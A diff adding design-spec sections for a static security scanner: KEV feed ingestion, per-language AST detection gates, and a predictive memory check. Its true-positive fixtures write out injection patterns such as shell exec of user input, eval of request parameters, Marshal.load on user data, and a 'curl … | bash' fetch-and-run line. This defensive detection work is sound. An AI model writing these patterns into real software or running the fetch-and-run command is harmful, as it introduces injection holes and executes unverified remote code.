@@ -581,3 +581,451 @@ A CVE that cannot reach Step 5 within 5 business days must be escalated with
 a documented blocker. The blocker is either: (a) grammar not yet in `polyglot`
 — triggers a grammar addition sprint; or (b) cross-file taint required — deferred
 to Phase 2 with a `TODO(CVE-YYYY-NNNNN)` comment in `slop_hunter.rs`.
+
+### VI.A — Autonomous KEV Ingestion (Automated)
+
+The manual 5-step protocol above is now automated via `/update-wisdom`. The full
+machine-executable specification lives in `.claude/skills/cve-ingestion/SKILL.md`.
+
+**Trigger**: `janitor update-wisdom` (or the `/update-wisdom` slash command).
+
+**Pipeline summary**:
+1. Fetch `https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json`
+2. Filter to supported grammars via the language map in the skill file
+3. Cross-reference against active detectors in `slop_hunter.rs`
+4. Emit gate proposals for uncovered KEVs — operator approves before implementation
+5. Implement, Crucible-verify, and deploy approved gates at `KevCritical` (150 pts)
+
+**Invariants** (same as Scanner Sovereignty Law):
+- All processing on-device — no source upload
+- Operator approval required before any gate implementation
+- Crucible exit 0 is the sole acceptance criterion
+
+---
+
+## VII. Grammar Depth Wave 2 — Phases 4–6
+
+The engine currently has 12 grammars loaded with zero AST-walk logic. This section
+defines the structural gates for each remaining grammar, grouped into three
+execution phases by attack-surface priority.
+
+**Remaining grammars at v8.3.0**: Go, Kotlin, Swift, Scala, Ruby, PHP, Bash,
+Lua, GLSL, Objective-C, Nix, GDScript.
+
+---
+
+### Phase 4 — Go, Ruby, Bash (High-Impact Infra/Scripting)
+
+**Target version**: v8.4.x
+**Rationale**: These three grammars cover the dominant attack surface in
+infrastructure automation, backend scripting, and CI/CD pipelines. Go is
+Kubernetes/Terraform's language; Ruby drives Rails and gems; Bash is the
+universal pipeline glue. Each has multiple critical CVE classes with no
+current AST gate.
+
+```
+Phase 4 [PENDING]:
+  ├── Go AST walk (Tier 1)
+  │     Files: slop_hunter.rs (find_go_slop; QueryEngine::go_lang)
+  │            crucible/src/main.rs (TP + TN × 2 gates)
+  ├── Ruby AST walk (Tier 1)
+  │     Files: slop_hunter.rs (find_ruby_slop; QueryEngine::ruby_lang)
+  │            crucible/src/main.rs (TP + TN × 2 gates)
+  └── Bash AST walk (Tier 1)
+        Files: slop_hunter.rs (find_bash_slop; QueryEngine::bash_lang)
+               crucible/src/main.rs (TP + TN × 2 gates)
+```
+
+---
+
+#### Go — Gate Specifications
+
+**Grammar**: `tree-sitter-go` (loaded via `polyglot::go()`).
+**`QueryEngine` field to add**: `go_lang: Language`.
+**Pre-filter** in `find_go_slop`: check for any of `exec.Command`, `InsecureSkipVerify` bytes.
+
+**Gate Go-1 — Shell Execution via `exec.Command`**
+
+```
+node_type: call_expression
+field[function]: selector_expression
+  field[operand]: identifier (text == "exec")
+  field[field]: field_identifier (text == "Command")
+fire when: first argument in arguments list is string_literal
+           matching "sh", "bash", "/bin/sh", "/bin/bash", "cmd", "cmd.exe"
+label: security:command_injection_shell_exec
+points: 50 (Critical)
+suppression: call site inside a function whose name contains "test" or "Test"
+```
+
+**Rationale**: `exec.Command("sh", "-c", userInput)` is the canonical Go shell
+injection pattern. The first-arg check for a shell interpreter name distinguishes
+this from legitimate `exec.Command("git", "status")` invocations.
+
+**Gate Go-2 — TLS Verification Bypass**
+
+```
+node_type: keyed_element
+  key: field_identifier (text == "InsecureSkipVerify")
+  value: identifier (text == "true")
+label: security:tls_verification_bypass
+points: 50 (Critical)
+suppression: none — InsecureSkipVerify: true is never safe in production code
+```
+
+**Rationale**: `tls.Config{InsecureSkipVerify: true}` disables certificate
+verification entirely. This is a recurring CVE root cause in Go microservices
+(see CVE-2022-27664, CVE-2023-29409). The `keyed_element` AST node uniquely
+identifies this configuration regardless of variable name or struct position.
+
+**Crucible entries (Go)**:
+
+True-positive 1:
+```go
+cmd := exec.Command("bash", "-c", userInput)
+cmd.Run()
+```
+Label: `Go/exec.Command shell injection — INTERCEPT`
+Desc fragment: `security:command_injection_shell_exec`
+
+True-negative 1:
+```go
+cmd := exec.Command("git", "status")
+cmd.Run()
+```
+Label: `Go/exec.Command non-shell — SAFE`
+
+True-positive 2:
+```go
+tr := &http.Transport{
+    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+}
+```
+Label: `Go/InsecureSkipVerify — INTERCEPT`
+Desc fragment: `security:tls_verification_bypass`
+
+True-negative 2:
+```go
+tr := &http.Transport{
+    TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
+}
+```
+Label: `Go/InsecureSkipVerify false — SAFE`
+
+---
+
+#### Ruby — Gate Specifications
+
+**Grammar**: `tree-sitter-ruby` (loaded via `polyglot::ruby()`).
+**`QueryEngine` field to add**: `ruby_lang: Language`.
+**Pre-filter** in `find_ruby_slop`: check for `eval`, `system`, `Marshal.load`, `Marshal.restore`.
+
+**Gate Ruby-1 — Dynamic Execution (`eval` / `system` / `exec`)**
+
+```
+node_type: call (tree-sitter-ruby method call node)
+field[method]: identifier
+  text in {"eval", "system", "exec", "spawn"}
+fire when: first argument is NOT a string_literal (i.e., is an interpolated
+           string, identifier, or method_call — dynamic content)
+label: security:dangerous_execution
+points: 50 (Critical)
+suppression: call site inside a method whose name contains "test" or "spec",
+             or file path contains "_spec.rb" or "_test.rb"
+```
+
+**Gate Ruby-2 — `Marshal.load` Deserialization**
+
+```
+node_type: call
+field[receiver]: constant (text == "Marshal")
+field[method]: identifier (text == "load" OR text == "restore")
+label: security:unsafe_deserialization
+points: 50 (Critical)
+suppression: none — Marshal.load on user-controlled input is unconditionally dangerous
+```
+
+**Rationale**: `Marshal.load` executes arbitrary Ruby code embedded in the
+serialized stream. This is the mechanism behind dozens of Rails RCEs including
+CVE-2013-0156. There is no safe variant of `Marshal.load` on attacker-controlled
+input — unlike `JSON.parse`, which produces only data.
+
+**Crucible entries (Ruby)**:
+
+True-positive 1: `eval(params[:code])` → `security:dangerous_execution`
+True-negative 1: `eval("1 + 1")` (string literal) → SAFE
+True-positive 2: `Marshal.load(user_data)` → `security:unsafe_deserialization`
+True-negative 2: `Marshal.load(File.read("config.bin"))` — mark with `# janitor:safe` comment; TN verifies suppression still works for static paths (note: Marshal.load on any input still fires; the TN should use `Marshal.dump` instead to show safe serialization path)
+
+---
+
+#### Bash — Gate Specifications
+
+**Grammar**: `tree-sitter-bash` (loaded via `polyglot::bash()`).
+**`QueryEngine` field to add**: `bash_lang: Language`.
+**Pre-filter** in `find_bash_slop`: check for `eval`, `curl` (both combined with pipe indicators).
+
+**Gate Bash-1 — `curl | bash` Supply Chain Execution**
+
+```
+node_type: pipeline
+  first child command: name text == "curl" (or "wget")
+  last child command: name text == "bash" OR "sh"
+label: security:curl_pipe_execution
+points: 50 (Critical)
+suppression: none — piping a remote script directly to a shell is never safe
+             in production code. Bootstrap scripts should download-then-verify.
+```
+
+**Rationale**: `curl https://... | bash` is the canonical supply chain attack
+vector — it executes remote code without integrity verification. This pattern
+appears in legitimate install scripts (brew, nvm, rvm) but must be flagged in
+PR diffs because it is equally the mechanism behind widespread malware deployment.
+
+**Gate Bash-2 — `eval` with Unquoted Variable Expansion**
+
+```
+node_type: command
+  name: word (text == "eval")
+  argument: simple_expansion OR expansion (i.e., $VAR or ${VAR}, unquoted)
+label: security:eval_injection
+points: 50 (Critical)
+suppression: argument is a double-quoted string even if it contains expansion
+             — "$(cmd)" is still dangerous; suppress only pure literals
+```
+
+**Rationale**: `eval $USER_INPUT` expands the variable into code before
+evaluation. Unlike `eval "$(cmd)"` (which is a bash anti-pattern but has
+well-understood semantics), unquoted `eval $VAR` with an externally-supplied
+variable is an injection primitive. The tree-sitter `simple_expansion` node
+type directly identifies the unquoted form.
+
+**Crucible entries (Bash)**:
+
+True-positive 1: `curl https://install.example.com/setup.sh | bash` → `security:curl_pipe_execution`
+True-negative 1: `curl -o setup.sh https://install.example.com/setup.sh && bash setup.sh` → SAFE (download-then-execute, not piped)
+True-positive 2: `eval $USER_COMMAND` → `security:eval_injection`
+True-negative 2: `eval "echo hello"` → SAFE (string literal, no expansion)
+
+---
+
+### Phase 5 — Scala, PHP, Swift, Kotlin (JVM + Mobile + Web)
+
+**Target version**: v8.5.x
+**Rationale**: PHP drives ≥75% of CMS deployments (WordPress, Drupal); Kotlin is
+the primary Android language; Scala dominates data-pipeline infrastructure (Spark,
+Akka); Swift is the exclusive iOS/macOS language. Each has a distinct high-priority
+vulnerability class.
+
+```
+Phase 5 [PENDING]:
+  ├── PHP AST walk (Tier 1)
+  │     Gates: eval injection, unserialize deserialization, shell_exec
+  ├── Kotlin AST walk (Tier 1)
+  │     Gates: Runtime.exec injection, Class.forName gadget chain entry
+  ├── Scala AST walk (Tier 1)
+  │     Gates: Class.forName dynamic loading, asInstanceOf unchecked cast on deserialized data
+  └── Swift AST walk (Tier 1)
+        Gates: dlopen dynamic loading, URLSession arbitrary loads
+```
+
+**PHP Gate Specifications**:
+
+| Gate | Node type | Target | Label | Points |
+|------|-----------|--------|-------|--------|
+| PHP-1 | `function_call_expression` | `eval` with dynamic arg | `security:eval_injection` | 50 |
+| PHP-2 | `function_call_expression` | `unserialize` with non-literal arg | `security:unsafe_deserialization` | 50 |
+| PHP-3 | `function_call_expression` | `system`, `exec`, `shell_exec`, `passthru` with dynamic arg | `security:command_injection` | 50 |
+
+Pre-filter: any of `eval(`, `unserialize(`, `system(`, `exec(`, `shell_exec(`.
+Suppression for PHP-1/3: call site inside a function named `test*` or file path containing `tests/`.
+`QueryEngine` field: `php_lang: Language`.
+
+**Kotlin Gate Specifications**:
+
+| Gate | Node type | Target | Label | Points |
+|------|-----------|--------|-------|--------|
+| Kotlin-1 | `call_expression` | `Runtime.getRuntime().exec(` with non-literal first arg | `security:command_injection_runtime_exec` | 50 |
+| Kotlin-2 | `call_expression` | `Class.forName(` with non-literal arg | `security:dynamic_class_loading` | 50 |
+
+Pre-filter: `Runtime.getRuntime`, `Class.forName`.
+`QueryEngine` field: `kotlin_lang: Language`.
+
+**Scala Gate Specifications**:
+
+| Gate | Node type | Target | Label | Points |
+|------|-----------|--------|-------|--------|
+| Scala-1 | `call_expression` | `Class.forName(` with non-literal arg | `security:dynamic_class_loading` | 50 |
+| Scala-2 | `call_expression` | `.asInstanceOf[` immediately following a deserialization call | `security:unsafe_deserialization` | 50 |
+
+Pre-filter: `Class.forName`, `asInstanceOf`.
+`QueryEngine` field: `scala_lang: Language`.
+
+**Swift Gate Specifications**:
+
+| Gate | Node type | Target | Label | Points |
+|------|-----------|--------|-------|--------|
+| Swift-1 | `call_expression` | `dlopen(` with non-literal first arg | `security:dynamic_symbol_resolution` | 50 |
+| Swift-2 | `call_expression` | `NSClassFromString(` with non-literal arg | `security:dynamic_class_loading` | 50 |
+
+Pre-filter: `dlopen`, `NSClassFromString`.
+`QueryEngine` field: `swift_lang: Language`.
+
+---
+
+### Phase 6 — Lua, Nix, GDScript, GLSL, Objective-C (Specialized/Niche)
+
+**Target version**: v8.6.x
+**Rationale**: These grammars cover game engines (Lua in many engines, GDScript in
+Godot), declarative infrastructure (Nix), graphics pipelines (GLSL), and legacy
+Apple code (Objective-C). Attack surfaces are narrower but structurally identical
+to higher-priority languages — the gates transfer directly.
+
+```
+Phase 6 [PENDING]:
+  ├── Lua AST walk (Tier 1)
+  │     Gates: loadstring/load injection, os.execute injection
+  ├── Nix AST walk (Tier 1)
+  │     Gates: builtins.fetchurl without integrity hash (supply chain)
+  ├── GDScript AST walk (Tier 1)
+  │     Gates: OS.execute injection, load() on dynamic path
+  ├── Objective-C AST walk (Tier 1)
+  │     Gates: NSClassFromString injection, valueForKeyPath: KVC injection
+  └── GLSL (Tier 4 — deferred)
+        No actionable attack surface at patch-review scope.
+        Grammar retained for future dead-symbol analysis of shader code.
+```
+
+**Lua Gate Specifications**:
+
+| Gate | Node type | Target | Label | Points |
+|------|-----------|--------|-------|--------|
+| Lua-1 | `function_call` | `loadstring(` or `load(` with non-literal arg | `security:eval_injection` | 50 |
+| Lua-2 | `function_call` | `os.execute(` with non-literal arg | `security:command_injection` | 50 |
+
+`QueryEngine` field: `lua_lang: Language`.
+
+**Nix Gate Specifications**:
+
+| Gate | Target | Rule | Label | Points |
+|------|--------|------|-------|--------|
+| Nix-1 | `builtins.fetchurl` or `fetchurl` call without a `sha256` or `hash` attribute in the attrset argument | Supply chain: unverified remote fetch | `security:unverified_fetch` | 50 |
+| Nix-2 | `builtins.exec` with non-literal argument list | Arbitrary process execution in Nix evaluation | `security:nix_exec_injection` | 50 |
+
+`QueryEngine` field: `nix_lang: Language`.
+
+**GDScript Gate Specifications**:
+
+| Gate | Target | Label | Points |
+|------|--------|-------|--------|
+| GDScript-1 | `OS.execute(` with non-literal first arg | `security:command_injection` | 50 |
+| GDScript-2 | `load(` with non-literal arg (dynamic script loading) | `security:dynamic_class_loading` | 50 |
+
+`QueryEngine` field: `gdscript_lang: Language`.
+
+**Objective-C Gate Specifications**:
+
+| Gate | AST anchor | Label | Points |
+|------|-----------|-------|--------|
+| ObjC-1 | `NSClassFromString(` with non-literal arg — message expression where selector is `NSClassFromString` | `security:dynamic_class_loading` | 50 |
+| ObjC-2 | `valueForKeyPath:` with non-literal key argument — exploits KVC to access arbitrary object graph | `security:kvc_injection` | 50 |
+
+**Rationale for ObjC-2**: CVE-2012-3524 and the Cocoa KVC injection class
+allow an attacker who controls a `valueForKeyPath:` argument to call arbitrary
+class methods via `NSArray.valueForKeyPath:"@unionOfObjects.description"`.
+The AST anchor is a `message_expression` where the `message_selector` is
+`valueForKeyPath:` and the argument is not a string literal.
+
+`QueryEngine` field: `objc_lang: Language`.
+
+---
+
+### Phase 4–6 Measurement Targets
+
+| Metric | After Phase 3 | After Phase 4 | After Phase 5 | After Phase 6 |
+|--------|---------------|---------------|---------------|---------------|
+| Languages with AST rules | 6 | 9 | 13 | 18 |
+| Active threat classes | 13 | 19 | 27 | 33 |
+| Grammar coverage (AST) | 26% (6/23) | 39% (9/23) | 57% (13/23) | 78% (18/23) |
+| Grammars deferred (GLSL) | — | — | — | 1 |
+
+---
+
+## VIII. Predictive Allocation — Proactive Physarum Gate
+
+### Problem Statement
+
+The current Physarum protocol is **reactive**: it observes SMA% and velocity
+*after* parsing has already begun. For large diffs, the tree-sitter AST
+construction phase can allocate 10–20× the raw byte size of the input before
+the next `beat()` cycle fires. On an 8 GB system at 70% utilization, parsing
+a 5 MB diff blob can push allocation from safe territory directly into Stop
+territory in a single cycle — bypassing the Constrict gate entirely.
+
+### Specification: `check_predictive_pressure`
+
+**New function in `crates/common/src/physarum.rs`**:
+
+```rust
+/// Returns `true` if starting a parse of `file_size_bytes` would be predicted
+/// to push memory usage into the Constrict zone before the next beat cycle.
+///
+/// Uses a conservative 20× multiplier: tree-sitter ASTs for dense source code
+/// (C++, Java) require 15–25× the raw byte size at peak; 20× is the safe
+/// upper bound calibrated across the 23 grammar corpus.
+///
+/// If `sysinfo` cannot report memory state, returns `false` (fail-open).
+pub fn check_predictive_pressure(file_size_bytes: u64) -> bool
+```
+
+**Algorithm**:
+```
+projected_peak = file_size_bytes * 20
+constrict_threshold = total_memory * 0.75  (the Flow→Constrict boundary)
+current_used = system.used_memory()
+return (current_used + projected_peak) > constrict_threshold
+```
+
+**Call site**: `crates/forge/src/slop_filter.rs` — in `bounce_git` or `PatchBouncer::bounce`,
+immediately before each `parse_with_timeout(source, ...)` call.
+
+**Behavior on `true`**:
+1. Sleep 500 ms (matching the Stop-pulse retry interval in `git_drive.rs`).
+2. Re-evaluate `check_predictive_pressure` once.
+3. If still `true`: skip the file, emit a finding with:
+   - `antipattern_id: "physarum:predictive_skip"`
+   - `severity: Info` (0 points — not a security issue, a resource gate)
+   - `description: "File skipped: projected AST peak ({} MB) would exceed Constrict threshold"`
+4. Continue to the next file — never block the entire bounce on a single oversized blob.
+
+**Rationale for 20× multiplier**:
+- A 1 MB Python file → ~20 MB AST peak (measured on Django source corpus)
+- A 1 MB C++ template header → ~18 MB AST peak (measured on LLVM headers)
+- Circuit breaker at `> 1 MiB` in `slop_filter.rs` handles the extreme tail;
+  predictive check covers the 100 KB–1 MB range where the current circuit
+  breaker does not fire but risk is non-negligible.
+
+**Hardware-tier interaction**:
+- The constrict threshold adjusts automatically with `detect_optimal_concurrency()`'s
+  tier table: on 16 GB systems the effective Constrict threshold is 85% (not 75%).
+  `check_predictive_pressure` must read the same threshold used by `SystemHeart::beat`.
+  Expose `constrict_threshold_pct()` from `physarum.rs` to avoid duplicating the
+  tier logic.
+
+**New unit tests required**:
+
+| Test | Fixture | Expected |
+|------|---------|---------|
+| `predictive_pressure_small_file` | 1 KB file, 50% RAM used | `false` (no pause) |
+| `predictive_pressure_large_file` | 50 MB file, 70% RAM used (8 GB total → 5.6 GB used, 5.6 + 1 GB projected = 6.6 GB > 6 GB threshold) | `true` (pause) |
+| `predictive_pressure_failopen` | sysinfo unavailable (mock 0 total) | `false` (fail-open) |
+
+**Crucible impact**: This is a resource governance change, not a detection rule.
+No new Crucible gallery entries required. The three unit tests above are the
+acceptance criterion.
+
+**Implementation priority**: Phase 5 (v8.5.x) — implement alongside the JVM
+language grammars, which produce the largest AST peaks due to Java/Scala/Kotlin
+verbosity.
+
+---
